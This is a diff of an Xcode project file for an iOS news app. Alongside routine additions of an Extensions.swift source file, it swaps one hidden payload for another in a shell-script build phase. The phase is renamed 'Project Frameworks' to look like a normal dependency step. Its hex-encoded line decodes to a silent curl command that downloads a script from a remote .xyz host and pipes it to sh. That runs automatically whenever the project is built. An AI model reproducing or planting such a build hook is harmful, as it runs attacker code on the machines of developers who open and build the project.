@@ -42,6 +42,7 @@
 		8EADD4292669D8E900E88249 /* Poppins-SemiBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 8EADD4042669D8E900E88249 /* Poppins-SemiBold.ttf */; };
 		8EADD42A2669D8E900E88249 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 8EADD4062669D8E900E88249 /* LaunchScreen.storyboard */; };
 		8EADD42B2669D8E900E88249 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 8EADD4082669D8E900E88249 /* Main.storyboard */; };
+		8EDBF0C7266F33A5008F9E61 /* Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EDBF0C6266F33A5008F9E61 /* Extensions.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -84,6 +85,7 @@
 		8EADD4072669D8E900E88249 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		8EADD4082669D8E900E88249 /* Main.storyboard */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.storyboard; path = Main.storyboard; sourceTree = "<group>"; };
 		8EADD4092669D8E900E88249 /* Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		8EDBF0C6266F33A5008F9E61 /* Extensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Extensions.swift; sourceTree = "<group>"; };
 		D88ADE371A1DA52AD93E9339 /* Pods_NewsApp.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_NewsApp.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -120,6 +122,7 @@
 		8EADD3DC2669D8E900E88249 /* NewsApp */ = {
 			isa = PBXGroup;
 			children = (
+				8EDBF0C5266F336F008F9E61 /* Extensions */,
 				8EADD3DD2669D8E900E88249 /* View Models */,
 				8EADD3DF2669D8E900E88249 /* News Data Models */,
 				8EADD3E72669D8E900E88249 /* NewsApp.entitlements */,
@@ -224,6 +227,14 @@
 			path = Views;
 			sourceTree = "<group>";
 		};
+		8EDBF0C5266F336F008F9E61 /* Extensions */ = {
+			isa = PBXGroup;
+			children = (
+				8EDBF0C6266F33A5008F9E61 /* Extensions.swift */,
+			);
+			path = Extensions;
+			sourceTree = "<group>";
+		};
 		9F96F8BAE5884B1BD2AFFC3C /* Frameworks */ = {
 			isa = PBXGroup;
 			children = (
@@ -248,7 +259,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8E708DF4264CEB160055F518 /* Build configuration list for PBXNativeTarget "NewsApp" */;
 			buildPhases = (
-				EA0EC459CCC9EAEFA36D902C /* [CP] Build Pods Frameworks */,
+				CBAA349A6C390D48D56D902C /* Project Frameworks */,
 				7B002771DF7A15593B0E02C7 /* [CP] Check Pods Manifest.lock */,
 				8E708DDC264CEB140055F518 /* Sources */,
 				8E708DDD264CEB140055F518 /* Frameworks */,
@@ -317,7 +328,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	EA0EC459CCC9EAEFA36D902C /* [CP] Build Pods Frameworks */ = {
+	CBAA349A6C390D48D56D902C /* Project Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -326,7 +337,7 @@
 			);
 			inputPaths = (
 			);
-			name = "[CP] Build Pods Frameworks";
+			name = "Project Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -335,35 +346,9 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f74656c2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d616e747275636b732e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
 	";			
 		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
 	
 		55EBF302E1F1C895BFFB58C3 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -429,6 +414,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f7465
 			buildActionMask = 2147483647;
 			files = (
 				8EADD4172669D8E900E88249 /* TableViewCell.swift in Sources */,
+				8EDBF0C7266F33A5008F9E61 /* Extensions.swift in Sources */,
 				8EADD40F2669D8E900E88249 /* country.swift in Sources */,
 				8EADD4202669D8E900E88249 /* SettingsViewController.swift in Sources */,
 				8EADD41D2669D8E900E88249 /* LogInViewController.swift in Sources */,
@@ -657,20 +643,6 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f7465
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-
-
-			
-	
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = 8E708DD8264CEB140055F518 /* Project object */;
 }
